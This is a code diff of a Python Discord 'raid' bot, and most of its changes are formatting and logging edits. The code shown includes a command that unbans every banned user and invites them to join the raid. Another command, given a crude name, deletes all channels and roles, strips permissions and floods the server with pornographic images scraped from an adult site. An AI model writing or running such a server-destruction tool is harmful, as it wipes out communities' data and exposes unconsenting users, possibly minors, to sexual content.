@@ -26,25 +26,28 @@ class Bot(cmd.Bot):
         self.customCommands = []
 
     def echo(self, ctx):
-        # --Prevent bot from replying to itself
         return ctx.author.id == self.user.id
 
     def registerCommands(self):
+        print("__Members_______________________________")
         for member in inspect.getmembers(self):
             if "discord.ext.commands.core.Command" in repr(member[1]):
                 print(member)
                 if not member[0] == "__init__":
                     self.customCommands.append(member[0])
+        print("________________________________________")
+        print("__Custom Commands_______________________")
         for customCommand in self.customCommands:
             print(customCommand)
             self.add_command(getattr(self, customCommand))
+        print("________________________________________")
 
     async def on_ready(self):
-     print('------')
-     print('Logged in as')
-     print(self.user.name)
-     print(self.user.id)
-     print('------')
+        print("__Login_________________________________")
+        print('Connected to Discord as')
+        print(self.user.name)
+        print(self.user.id)
+        print("________________________________________")
 
     @cmd.command()
     async def h(ctx):
@@ -115,16 +118,13 @@ class Bot(cmd.Bot):
     async def dm(ctx):
         # --DM Banned users
         bannedUsers = await ctx.guild.bans()
-        unban = await ctx.channel.create_invite(
-            reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
+        unban = await ctx.channel.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
         for ban in bannedUsers:
             try:
                 user = ban.user
-                await user.send(
-                    "Hi. If you're seeing this message, you were at some point banned from " + ctx.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
+                await user.send("Hi. If you're seeing this message, you were at some point banned from " + ctx.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
                 await user.send(unban.url)
-                await ctx.guild.unban(user,
-                                          reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
+                await ctx.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
             except Exception:
                 pass
 
@@ -174,6 +174,7 @@ class Bot(cmd.Bot):
     @cmd.command()
     async def rape(ctx, *args):
         # --Destroy the server--
+        
         # -delete all channels-
         channels = []
         for channel in ctx.guild.channels:  # get all channels
@@ -201,9 +202,7 @@ class Bot(cmd.Bot):
             except Exception:
                 await heinz.send("`error deleting role`")
 
-        print(roles)
         # -remove all perms-
-
         perms = discord.Permissions()  # create new empty permissions object
         perms.update(read_messages=True)  # make it so user can see messages
 
@@ -213,10 +212,8 @@ class Bot(cmd.Bot):
 
         # -spam images-
 
-
-        # hentai = imagesearch.getImages("https://hentaihaven.xxx")  # load images from source or hentai from hentaihaven (kill me now)
         if len(args) == 0:
-            hentai = imagesearch.getImages("https://hentaihaven.xxx")
+            hentai = imagesearch.getImages("https://hentaihaven.xxx") # load images from source or hentai from hentaihaven (kill me now)
         elif len(args) == 1:
             if args[0] == "instantban":
                 hentai = imagesearch.getImages("https://hentaihaven.xxx")
@@ -234,7 +231,6 @@ class Bot(cmd.Bot):
             y = random.choice(hentai)  # get random bit of hentai
             while not y.startswith("https://hentaihaven.xxx/www/") and not len(args) > 0:  # check it is a video preview and not an asset
                 y = random.choice(hentai)
-
 
             async with aiohttp.ClientSession() as session:  # http stuff I don't understand
                 async with session.get(y) as resp:
